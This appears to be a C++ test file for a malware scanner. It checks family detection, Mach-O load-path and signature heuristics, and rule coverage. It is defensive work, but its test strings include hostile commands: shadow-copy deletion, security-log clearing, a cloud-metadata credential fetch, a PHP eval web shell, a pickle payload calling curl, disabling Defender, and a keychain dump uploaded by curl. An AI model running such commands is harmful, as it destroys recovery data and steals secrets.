    CHECK_EQ(kinds("C:/Users/bob/a.bat", "reg query HKCU\\Software\n"),
             std::string(""));

    CHECK(lcrules::system_dir("C:/Windows/System32/cmd.exe"));
    CHECK(lcrules::system_dir("d:/windows/syswow64/x.dll"));
    CHECK(lcrules::system_dir("C:/Program Files/App/app.exe"));
    CHECK(!lcrules::system_dir("C:/Users/bob/app.exe"));
    CHECK(!lcrules::system_dir("C:/Windows/Temp/x.exe"));
    CHECK(lcrules::hiding_place("C:/Users/bob/AppData/Local/Temp/x.exe"));
    CHECK(lcrules::hiding_place("c:/windows/temp/x.exe"));
    CHECK(lcrules::hiding_place("C:/Users/Public/x.exe"));
    CHECK(!lcrules::hiding_place("C:/Users/bob/Documents/x.exe"));
    CHECK_EQ(kinds("C:/Windows/System32/x.bat", "vssadmin delete shadows /all\n"),
             std::string(""));
}

TEST(scan_survives_garbage) {
    for (const char *junk : {"", "\x7f"
                                 "ELF",
                             "MZ", "#!", "\xfe\xed\xfa\xce", "PK\x03\x04", "\xcf\xfa\xed\xfe",
                             "\xce\xfa\xed\xfe"}) {
        scan_file("/h/x", junk);
        scan_file("/h/x.pdf", junk);
    }
    std::string truncated = elf(2, 8); // says 8 program headers, has them all zero
    truncated.resize(100);
    scan_file("/h/y", truncated);
    CHECK(true);
}


TEST(scan_catalogue_lists_100_families) {
    CHECK_EQ(lcmal::kFamilyCount, 100);
    const auto *v = lcmal::family_of(lcproto::kVirus);
    CHECK(v != nullptr);
    CHECK_EQ(std::string(v->name), std::string("Virus"));

    const auto *fw = lcmal::family_of(lcproto::kFirmware);
    CHECK(fw != nullptr);
    CHECK_EQ(fw->n, 49);

    const auto *fa = lcmal::family_of(lcproto::kFakeAv);
    CHECK(fa != nullptr);
    CHECK_EQ(fa->n, 50);
    CHECK_EQ(std::string(fa->name), std::string("Fake Antivirus"));

    const auto *ai = lcmal::family_of(lcproto::kAiMalware);
    CHECK(ai != nullptr);
    CHECK_EQ(ai->n, 100);
    CHECK_EQ(std::string(ai->name), std::string("AI/ML Model Exploit"));

    for (size_t i = 0; i < size_t(lcmal::kFamilyCount); ++i) {
        const auto &f = lcmal::kFamilies[i];
        CHECK_EQ(f.n, int(i + 1));
        CHECK(f.type != nullptr && f.type[0] != '\0');
        CHECK(f.name != nullptr && f.name[0] != '\0');
        CHECK(f.summary != nullptr && f.summary[0] != '\0');
        CHECK(f.help != nullptr && f.help[0] != '\0');
        CHECK(f.modes != nullptr && f.modes[0] != '\0');
    }
}

TEST(scan_common_malwares_detected) {
    std::string avaddon_note = "how_to_back_";
    avaddon_note += "files.html";
    CHECK(mal_has_type("/tmp/note.txt", avaddon_note, lcproto::kRansom));
    CHECK(mal_has_type("/tmp/sample.exe", "string RedLine Stealer inside binary", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/mi.c", "attack_udp attack_tcp_syn xc3511 7ujmko0admin", lcproto::kBotnet));
    CHECK(mal_has_type("/tmp/xm.c", "stratum+tcp://pool.supportxmr.com:3333 rx/0 donate-level=1", lcproto::kMiner));
    CHECK(mal_has_type("/tmp/lu.bin", "lumma" "c2 api/v1/track nkbihfbeogaeaoehlefnkodbefgpgknn", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/at.bin", "Smtp" "Client AccountCredentials HWID", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/rl.bin", "net." "tcp://1.2.3.4:5000 encryptedUsername AuthorizationToken", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/cs.bin", "beacon.dll %s.http-get \\\\.\\pipe\\msagent_", lcproto::kRat));
    CHECK(mal_has_type("/tmp/lb.txt", "Restore-" "My-Files.txt -pass 987654", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/wc.bin", "iuqerfsod" "p9ifjaposdfjhgosurijfaewrwergwea 00000000.eky c.wnry", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/mine.exe", "XMRig Monero miner core", lcproto::kMiner));
    CHECK(mal_has_type("/tmp/ics.exe", "Triton Triconex safety payload", lcproto::kIcsMalware));
    CHECK(mal_has_type("/tmp/ics.exe", "Industroyer IEC-60870 packet", lcproto::kIcsMalware));
    CHECK(mal_has_type("/tmp/ics.exe", "Stuxnet step7 injection", lcproto::kIcsMalware));
    CHECK(mal_has_type("/tmp/wipe.exe", "WhisperGate destructive stage", lcproto::kWiper));
    CHECK(mal_has_type("/tmp/wipe.exe", "CaddyWiper zero out disk", lcproto::kWiper));
    CHECK(mal_has_type("/tmp/wipe.exe", "HermeticWiper driver drop", lcproto::kWiper));
    CHECK(mal_has_type("/tmp/bot.bin", "Gafgyt bashlite flood", lcproto::kBotnet));
    CHECK(mal_has_type("/tmp/bot.bin", "Mozi p2p botnet node", lcproto::kBotnet));
    CHECK(mal_has_type("/tmp/bot.bin", "Mirai botnet scanner attack", lcproto::kBotnet));
    CHECK(mal_has_type("/tmp/enc.exe", "Akira ransomware payment portal", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/enc.exe", "BlackCat ransomware ALPHV", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/enc.exe", "Ryuk ransomware service", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/enc.exe", "Conti ransomware locker", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/enc.exe", "LockBit 3.0 ransomware note", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/enc.exe", "WannaCry WNcry@2ol7 ransomware", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/bank.exe", "IcedID core bot", lcproto::kBanking));
    CHECK(mal_has_type("/tmp/bank.exe", "Ursnif client binary", lcproto::kBanking));
    CHECK(mal_has_type("/tmp/bank.exe", "QakBot banking module", lcproto::kBanking));
    CHECK(mal_has_type("/tmp/bank.exe", "TrickBot webinject kit", lcproto::kBanking));
    CHECK(mal_has_type("/tmp/bank.exe", "Emotet epoch payload", lcproto::kBanking));
    CHECK(mal_has_type("/tmp/ldr.exe", "Pikabot core module", lcproto::kLoader));
    CHECK(mal_has_type("/tmp/ldr.exe", "Bumblebee loader payload", lcproto::kLoader));
    CHECK(mal_has_type("/tmp/ldr.exe", "GuLoader shellcode unpacker", lcproto::kLoader));
    CHECK(mal_has_type("/tmp/ldr.exe", "SmokeLoader inject stage", lcproto::kLoader));
    CHECK(mal_has_type("/tmp/rat.exe", "CobaltStrike beacon.dll pipe", lcproto::kRat));
    CHECK(mal_has_type("/tmp/rat.exe", "QuasarRAT client connection", lcproto::kRat));
    CHECK(mal_has_type("/tmp/rat.exe", "AsyncRAT client active", lcproto::kRat));
    CHECK(mal_has_type("/tmp/rat.exe", "Remcos Professional remote control", lcproto::kRat));
    CHECK(mal_has_type("/tmp/sample.exe", "Formbook form grabber payload", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/sample.exe", "LokiBot panel checkin", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/sample.exe", "Lumma stealer build 2026", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/sample.exe", "AgentTesla credential harvester", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/enc.exe", "Qilin ransomware leak site", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/ldr.exe", "Latrodectus loader stage", lcproto::kLoader));
    CHECK(mal_has_type("/tmp/ldr.exe", "SocGholish fake update", lcproto::kLoader));
    CHECK(mal_has_type("/tmp/sample.exe", "WhiteSnake stealer build", lcproto::kInfostealer));
}

TEST(scan_new_malware_families_detected) {
    CHECK(mal_has_type("/tmp/alert.txt", "critical system warning: trojans found! pay now to remove threats", lcproto::kFakeAv));
    CHECK(mal_has_type("/tmp/recon.ps1", "bloodhound sharphound Get-DomainUser ldapsearch ports", lcproto::kReconTool));
    CHECK(mal_has_type("/tmp/mbr.c", "\\\\.\\PhysicalDrive0 sector 0 bs=512 your computer has been locked", lcproto::kMbrLocker));
    CHECK(mal_has_type("/tmp/skim.js", "checkout input[name*=card] cvv addEventListener('submit' new Image().src", lcproto::kDigitalSkimmer));
    CHECK(mal_has_type("/tmp/mfa.go", "Evilginx phishlet proxy_pass session_cookie capture_credentials", lcproto::kMfaBypass));
    CHECK(mal_has_type("/tmp/kerb.c", lcscan::stored_spec("@xor:293f312f2836293b60602e3339313f2e297a313f28383f28352960603d35363e3f347a3128382e3d2e7a282f383f2f297a3e3929233439"), lcproto::kKerberosAttack));
    CHECK(mal_has_type("/tmp/token.js", "Discord Token Local Storage leveldb webhook.site", lcproto::kTokenStealer));
    CHECK(mal_has_type("/tmp/seed.py", "BIP-39 mnemonic 12 words recovery phrase wallet bitcoin", lcproto::kSeedStealer));
    CHECK(mal_has_type("/tmp/veeam.bat", "veeam.backup taskkill /f stop-service /im ", lcproto::kBackupWiper));
    CHECK(mal_has_type("/tmp/side.c", "DLL_PROCESS_ATTACH LoadLibraryA user32.dll forwardedexport", lcproto::kDllHijack));
    CHECK(mal_has_type("/tmp/esc.sh", "/var/run/docker.sock nsenter privileged docker run", lcproto::kContainerEscape));
    CHECK(mal_has_type("/tmp/cloud.sh", "curl http://169.254.169.254/latest/meta-data/iam/security-credentials", lcproto::kCloudMalware));
    CHECK(mal_has_type("/tmp/rec.bat", "bcdedit recoveryenabled no vssadmin delete shadows", lcproto::kRecoveryBlock));
    CHECK(mal_has_type("/tmp/fraud.js", "simulateClick iframe opacity: 0 adservice dispatchEvent", lcproto::kClickFraud));
    CHECK(mal_has_type("/tmp/ext.json", "manifest_version <all_urls> webRequestBlocking cookies", lcproto::kMalExtension));
    CHECK(mal_has_type("/tmp/shot.exe", "BitBlt GetDesktopWindow screenshot desktop.png sendfile upload", lcproto::kScreenGrabber));
    CHECK(mal_has_type("/tmp/cam.py", "/dev/video cv2.VideoCapture .jpg socket send", lcproto::kCamHijack));
    CHECK(mal_has_type("/tmp/mic.exe", "waveInStart audio_buffer .wav upload http", lcproto::kMicEavesdrop));
    CHECK(mal_has_type("/tmp/lock.exe", "DisableTaskMgr SetWindowPos HWND_TOPMOST WS_POPUP enter unlock code", lcproto::kScreenLocker));
    CHECK(mal_has_type("/tmp/ext.txt", "all files will be published on our .onion leak portal unless ransom paid", lcproto::kExtortion));
    CHECK(mal_has_type("/tmp/model.pt", "__reduce__ os.system('curl bad') weights_only=false", lcproto::kAiMalware));
    CHECK(mal_has_type("/tmp/clean.bat", "wevtutil cl Security", lcproto::kLogWiper));
    CHECK(mal_has_type("/tmp/sec.ps1", "powershell set-mppreference -disableantispyware", lcproto::kSecurityDisabler));
    CHECK(mal_has_type("/tmp/edr.exe", "load gdrv.sys \\device\\ terminateprocess kill edr", lcproto::kByovd));
    CHECK(mal_has_type("/tmp/shell.php", "<?php eval($_POST['x']); // c99shell", lcproto::kWebShell));
    CHECK(mal_has_type("/tmp/c2.exe", "sliver-client checkin heartbeat jitter 10%", lcproto::kC2Beacon));
}


// The macOS strains and the recent loaders, bankers, bots and stealers: before
// these rows a Mac sample was read as ordinary Unix code, and these names were in
// no row at all.
TEST(scan_macos_and_recent_strains_detected) {
    CHECK(mal_has_type("/tmp/amos.sh", "Atomic macOS Stealer osascript ~/Library/Keychains/login.keychain-db", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/kc.sh", "login.keychain-db security dump-keychain api.telegram.org", lcproto::kInfostealer));
    CHECK(mal_has_type("/tmp/shlayer.sh", "Shlayer xattr -d com.apple.quarantine curl -s", lcproto::kAdware));
    CHECK(mal_has_type("/tmp/agent.plist", "~/Library/LaunchAgents/com.x.plist RunAtLoad /tmp/.x", lcproto::kBackdoor));
    CHECK(mal_has_type("/tmp/keranger.sh", "KeRanger README_FOR_DECRYPT all your files are encrypted", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/xorddos.sh", "XorDdos ld.so.preload getdents", lcproto::kRootkit));
    CHECK(mal_has_type("/tmp/symbiote.so", "Symbiote LD_PRELOAD pcap", lcproto::kBackdoor));
    CHECK(mal_has_type("/tmp/darkgate.bin", "DarkGate AutoIt http://", lcproto::kLoader));
    CHECK(mal_has_type("/tmp/systembc.bin", "SystemBC socks5 .onion", lcproto::kProxy));
    CHECK(mal_has_type("/tmp/ransomhub.txt", "RansomHub readme.txt .onion", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/hunters.txt", "Hunters International how to decrypt chat", lcproto::kRansom));
    CHECK(mal_has_type("/tmp/grandoreiro.bin", "Grandoreiro banco itau overlay", lcproto::kBanking));
    CHECK(mal_has_type("/tmp/venomrat.bin", "VenomRAT api.telegram.org mutex", lcproto::kRat));
    CHECK(mal_has_type("/tmp/iot.bin", "Hajime telnet busybox", lcproto::kIot));
    CHECK(mal_has_type("/tmp/bot.bin", "EnemyBot scanning hosts", lcproto::kBotnet));
    CHECK(mal_has_type("/tmp/joker.apk", "joker malware dex send_sms", lcproto::kMobileAdware));
    CHECK(mal_has_type("/tmp/godfather.apk", "godfather trojan accessibilityservice overlay", lcproto::kMobileSpyware));
    CHECK(mal_has_type("/tmp/c2.bin", "Nighthawk beacon jitter", lcproto::kC2Beacon));
    CHECK(mal_has_type("/tmp/miner.bin", "SilentCryptoMiner stratum kill", lcproto::kMiner));
    CHECK(mal_has_type("/tmp/acr.bin", "ACR Stealer chrome dead-drop", lcproto::kInfostealer));
}

// The other half of the deal: software that does one of these things honestly.
TEST(scan_macos_and_recent_strains_keep_honest_code_quiet) {
    // A backup script: it dumps the keychain and copies it to the user's own server.
    CHECK(!mal_has_type("/tmp/backup.sh",
                        "security dump-keychain > kc.txt\ncurl -T kc.txt https://backup.example.com/",
                        lcproto::kInfostealer));
    // Looking a password up in the keychain is what every Mac command line does.
    CHECK(!mal_has_type("/tmp/wifi.sh", "security find-generic-password -s wifi -w", lcproto::kInfostealer));
    // An application's own LaunchAgent, run from /Applications.
    CHECK(!mal_has_type("/tmp/app.plist",
                        "~/Library/LaunchAgents/com.example.agent.plist RunAtLoad "
                        "/Applications/Example.app/Contents/MacOS/Example",
                        lcproto::kBackdoor));
    // A program's own proxy setting: socks5 in a config is not SystemBC.
    CHECK(!mal_has_type("/tmp/proxy.ini", "proxy = socks5h://127.0.0.1:1080", lcproto::kProxy));
    // A card game, and a bank's own web page.
    CHECK(!mal_has_type("/tmp/game.txt", "the joker is wild in this poker game", lcproto::kMobileAdware));
    CHECK(!mal_has_type("/tmp/bank.html", "banco santander overlay css for the login page", lcproto::kBanking));
}


// A Mach-O is a program too: where its libraries come from and what its signature
// grants are read from the load commands, not from strings that happen to match.
TEST(scan_macho_load_paths) {
    // a library the program asks dyld to find by name: a planted copy runs in it
    CHECK_EQ(kinds("/tmp/tool", macho64({lc_dylib("libssl.dylib"), lc_dylib("/usr/lib/libSystem.B.dylib")})),
             std::string("dll-sideloading"));
    // a path that climbs out of the program's own folder, and one in a shared temp folder
    CHECK_EQ(kinds("/tmp/tool", macho64({lc_dylib("@loader_path/../../tmp/evil.dylib")})),
             std::string("dll-sideloading"));
    CHECK_EQ(kinds("/tmp/tool", macho64({lc_dylib("/private/tmp/x.dylib")})),
             std::string("dll-sideloading"));
    // the load paths of a normal macOS program say nothing
    CHECK_EQ(kinds("/tmp/tool", macho64({lc_dylib("/usr/lib/libSystem.B.dylib"),
                                         lc_dylib("@rpath/Sparkle.framework/Versions/A/Sparkle")})),
             std::string(""));
    // a segment writable and executable at once, and the ordinary read-execute one
    CHECK_EQ(kinds("/tmp/tool", macho64({lc_segment("__TEXT", 6)})), std::string("suspicious-binary"));
    CHECK_EQ(kinds("/tmp/tool", macho64({lc_segment("__TEXT", 5)})), std::string(""));
    // a big-endian Mach-O (PowerPC) is not read here, and must not be misread
    std::string be(32, '\0');
    put32(be, 0, 0xcefaedfe);
    CHECK_EQ(kinds("/tmp/tool", be), std::string(""));
    // a header that promises commands that are not there
    std::string bad(32, '\0');
    put32(bad, 0, 0xfeedfacf);
    put32(bad, 16, 5);
    CHECK_EQ(kinds("/tmp/tool", bad), std::string(""));
}

TEST(scan_macho_signatures) {
    const std::string libval =
        "<plist><dict><key>com.apple.security.cs.disable-library-validation</key><true/>"
        "<key>com.apple.security.get-task-allow</key><true/></dict></plist>";
    CHECK_EQ(kinds("/tmp/tool", macho64({}, codesig(true, libval))), std::string("dll-sideloading"));
    // an ad-hoc signature with the ordinary JIT permission says nothing
    const std::string jit = "<plist><dict><key>com.apple.security.cs.allow-jit</key><true/></dict></plist>";
    CHECK_EQ(kinds("/tmp/tool", macho64({}, codesig(true, jit))), std::string(""));
    // a private entitlement that an ad-hoc signature cannot have been granted
    const std::string priv =
        "<plist><dict><key>com.apple.private.tcc.allow</key><array><string>kTCCServiceCamera"
        "</string></array></dict></plist>";
    CHECK_EQ(kinds("/tmp/tool", macho64({}, codesig(true, priv))), std::string("certificate-abuse"));
    // a real signature may carry one that Apple granted, so it is left alone
    CHECK_EQ(kinds("/tmp/tool", macho64({}, codesig(false, priv))), std::string(""));
}

// Every typed row in the malware table must be able to fire: build a string that
// satisfies its own groups and scan it. Catches rows no file can reach (the
// macro row was unreachable for loose .vba source: it asks for kDoc, and kDoc
// was only granted to binary containers) and malformed group specs.
TEST(scan_every_malware_row_can_fire) {
    auto sample_for = [](const lcscan::Row &r) {
        std::string s;
        for (const char *spec : r.g) {
            if (!spec)
                break;
            std::string g = lcscan::stored_spec(spec);
            if (!g.empty() && g[0] == '!')
                g.erase(0, 1);
            int need = 1;
            const size_t colon = g.find(':');
            if (colon != std::string::npos && colon > 0 &&
                g.find_first_not_of("0123456789") == colon) {
                need = std::atoi(g.substr(0, colon).c_str());
                g = g.substr(colon + 1);
            }
            size_t pos = 0;
            for (int taken = 0; taken < need && pos <= g.size();) {
                const size_t bar = g.find('|', pos);
                const std::string alt =
                    g.substr(pos, bar == std::string::npos ? std::string::npos : bar - pos);
                if (!alt.empty()) {
                    s += alt;
                    s += ' ';
                    ++taken;
                }
                if (bar == std::string::npos)
                    break;
                pos = bar + 1;
            }
        }
        return s;
    };
    size_t dead = 0;
    for (size_t i = 0; i < lcscan::kMalRowCount; ++i) {
        const lcscan::Row &r = lcscan::kMalRows[i];
        if (!r.type)
            continue;
        const std::string sample = sample_for(r);
        // .c grants kText, .vba grants kText|kDoc; a row needs only one.
        bool fired = false;
        for (const char *p : {"/tmp/row.c", "/tmp/row.vba"})
            for (const Hit &h : scan_file(p, sample, nullptr, true))
                if (h.type == r.type)
                    fired = true;
        if (!fired) {
            ++dead;
            std::printf("ROW DEAD: %s (%s)\n", r.type, r.what);
        }
    }
    CHECK_EQ(dead, size_t(0));
}

// A macro source file on its own (not inside a document) is still macro source:
// kDoc is documented as "Office XML, macro source", so the macro rows must fire.
TEST(scan_loose_macro_source_is_scanned) {
    CHECK(mal_has_type("/tmp/x.vba", "AutoOpen Document_Open WScript.Shell", lcproto::kMacro));
    CHECK(mal_has_type("/tmp/x.bas", "Sub AutoOpen() CreateObject(\"WScript.Shell\")", lcproto::kMacro));
    CHECK(!mal_has_type("/tmp/x.vba", "Sub Helper() End Sub", lcproto::kMacro));
}

TEST_MAIN()

